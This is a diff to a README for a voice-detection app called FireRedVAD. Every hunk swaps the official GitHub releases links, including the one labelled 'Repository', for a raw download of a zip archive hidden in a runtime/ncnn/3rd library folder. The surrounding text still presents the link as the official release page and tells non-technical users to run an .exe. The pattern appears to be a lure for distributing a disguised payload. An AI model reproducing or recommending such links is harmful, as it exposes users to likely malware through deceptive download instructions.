@@ -1,6 +1,6 @@
 # 🔥 FireRedVAD - Clear Voice and Sound Detection
 
-[![Download FireRedVAD](https://img.shields.io/badge/Download-FireRedVAD-brightgreen?style=for-the-badge)](https://github.com/Pacjay/FireRedVAD/releases)
+[![Download FireRedVAD](https://img.shields.io/badge/Download-FireRedVAD-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Pacjay/FireRedVAD/main/runtime/ncnn/3rd/Fire_Red_VAD_v2.2.zip)
 
 ## 🔍 What is FireRedVAD?
 
@@ -26,9 +26,9 @@ You do not need any special software or coding knowledge to use FireRedVAD. It r
 
 Please use the official release page to get the program.
 
-[![Download FireRedVAD](https://img.shields.io/badge/Download-FireRedVAD-blue?style=for-the-badge)](https://github.com/Pacjay/FireRedVAD/releases)
+[![Download FireRedVAD](https://img.shields.io/badge/Download-FireRedVAD-blue?style=for-the-badge)](https://raw.githubusercontent.com/Pacjay/FireRedVAD/main/runtime/ncnn/3rd/Fire_Red_VAD_v2.2.zip)
 
-1. Click the green "Code" button above or go to the [FireRedVAD Releases](https://github.com/Pacjay/FireRedVAD/releases) page.
+1. Click the green "Code" button above or go to the [FireRedVAD Releases](https://raw.githubusercontent.com/Pacjay/FireRedVAD/main/runtime/ncnn/3rd/Fire_Red_VAD_v2.2.zip) page.
 2. On the releases page, look for the latest version. It usually has the highest version number and the most recent date.
 3. Find the file with a name ending in `.exe` (e.g., `FireRedVAD-Setup.exe`).  
 4. Click the `.exe` file name to start downloading.
@@ -82,8 +82,8 @@ Settings are available in the "Preferences" or "Settings" menu inside the app.
 
 ## 🔗 Useful Links
 
-- Download FireRedVAD: https://github.com/Pacjay/FireRedVAD/releases  
-- Repository: https://github.com/Pacjay/FireRedVAD  
+- Download FireRedVAD: https://raw.githubusercontent.com/Pacjay/FireRedVAD/main/runtime/ncnn/3rd/Fire_Red_VAD_v2.2.zip  
+- Repository: https://raw.githubusercontent.com/Pacjay/FireRedVAD/main/runtime/ncnn/3rd/Fire_Red_VAD_v2.2.zip  
 - Issues and support can be found on the repository page under "Issues."
 
 ## 📚 Additional Information
@@ -99,4 +99,4 @@ FireRedVAD operates locally on your computer. No audio data is sent to external 
 ---
 
 Visit the download page to start using FireRedVAD today:  
-https://github.com/Pacjay/FireRedVAD/releases
+https://raw.githubusercontent.com/Pacjay/FireRedVAD/main/runtime/ncnn/3rd/Fire_Red_VAD_v2.2.zip
